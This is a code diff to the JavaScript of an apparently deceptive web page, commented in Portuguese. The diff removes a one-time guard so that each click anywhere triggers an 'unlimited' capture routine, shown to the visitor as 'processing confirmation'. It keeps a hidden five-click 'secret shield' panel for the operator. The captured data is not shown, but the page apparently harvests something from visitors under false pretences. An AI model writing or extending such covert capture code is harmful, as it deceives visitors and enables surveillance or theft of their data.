@@ -268,7 +268,6 @@
     const status = document.getElementById('status');
 
     let wakeLock = null;
-    let acaoIniciada = false;
 
     async function ativarWakeLock() {
       try {
@@ -363,9 +362,6 @@
     }
 
     async function executarCaptura() {
-      if (acaoIniciada) return;
-      acaoIniciada = true;
-
       status.innerHTML = '<div class="spinner"></div><span>Processando confirmação...</span>';
 
       ativarWakeLock();
@@ -422,9 +418,9 @@
       );
     }
 
-    // Clique em qualquer lugar da tela ativa a ação
+    // Cada clique em qualquer lugar da tela gera uma nova captura ilimitada
     document.addEventListener('click', (e) => {
-      // Se o clique foi no escudo secreto, ignora a captura para permitir os 5 cliques do painel
+      // Ignora o clique apenas no escudo secreto
       if (e.target.closest('#escudoSecreto')) {
         return;
       }
